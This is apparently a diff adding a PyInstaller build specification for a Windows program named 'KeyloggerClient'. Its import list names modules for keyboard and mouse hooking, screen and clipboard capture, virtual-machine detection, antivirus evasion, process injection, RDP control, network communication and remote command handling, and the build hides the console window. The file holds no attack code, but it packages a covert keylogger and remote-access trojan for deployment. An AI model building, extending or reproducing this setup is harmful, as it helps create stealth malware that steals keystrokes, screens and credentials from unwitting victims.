@@ -1,0 +1,115 @@
+# -*- mode: python ; coding: utf-8 -*-
+
+block_cipher = None
+
+a = Analysis(
+    ['main.py'],
+    pathex=[],
+    binaries=[],
+    datas=[],
+    hiddenimports=[
+        'keyboard',
+        'pynput',
+        'pynput.keyboard',
+        'pynput.mouse',
+        'pynput._util',
+        'pynput._util.win32',
+        'pyautogui',
+        'PIL',
+        'PIL.Image',
+        'PIL.ImageGrab',
+        'PIL._imaging',
+        'psutil',
+        'psutil._pswindows',
+        'pyperclip',
+        'win32api',
+        'win32con',
+        'win32process',
+        'win32security',
+        'win32file',
+        'win32service',
+        'win32serviceutil',
+        'win32event',
+        'win32evtlog',
+        'win32evtlogutil',
+        'win32gui',
+        'win32ui',
+        'pywintypes',
+        'winreg',
+        'requests',
+        'urllib3',
+        'certifi',
+        'ssl',
+        'socket',
+        'cryptography',
+        'cryptography.hazmat',
+        'cryptography.hazmat.primitives',
+        'cryptography.hazmat.primitives.ciphers',
+        'cryptography.hazmat.primitives.ciphers.algorithms',
+        'cryptography.hazmat.primitives.ciphers.modes',
+        'cryptography.hazmat.backends',
+        'cryptography.hazmat.backends.openssl',
+        'cryptography.hazmat.primitives.padding',
+        'dotenv',
+        'packaging',
+        'packaging.version',
+        'json',
+        'base64',
+        'hashlib',
+        'system',
+        'system.file_manager',
+        'system.collector',
+        'system.vm_detector',
+        'system.anti_av',
+        'system.process_injector',
+        'monitoring',
+        'monitoring.logger',
+        'monitoring.rdp_controller',
+        'network',
+        'network.communicator',
+        'encryption',
+        'encryption.manager',
+        'commands',
+        'commands.handler',
+    ],
+    hookspath=[],
+    hooksconfig={},
+    runtime_hooks=[],
+    excludes=[],
+    win_no_prefer_redirects=False,
+    win_private_assemblies=False,
+    cipher=block_cipher,
+    noarchive=False,
+)
+
+# Collect all from important packages
+a.datas += collect_all('cryptography')[0]
+a.binaries += collect_all('cryptography')[1]
+a.datas += collect_all('PIL')[0]
+a.binaries += collect_all('PIL')[1]
+a.datas += collect_all('pynput')[0]
+a.datas += collect_all('certifi')[0]
+
+pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
+
+exe = EXE(
+    pyz,
+    a.scripts,
+    a.binaries,
+    a.zipfiles,
+    a.datas,
+    [],
+    name='KeyloggerClient',
+    debug=False,
+    bootloader_ignore_signals=False,
+    strip=False,
+    upx=False,  # Disable UPX compression
+    upx_exclude=[],
+    runtime_tmpdir=None,
+    console=False,  # No console window
+    disable_windowed_traceback=False,
+    argv_emulation=False,
+    target_arch=None,
+    codesign_identity=None,
+    entitlements_file=None,
+)
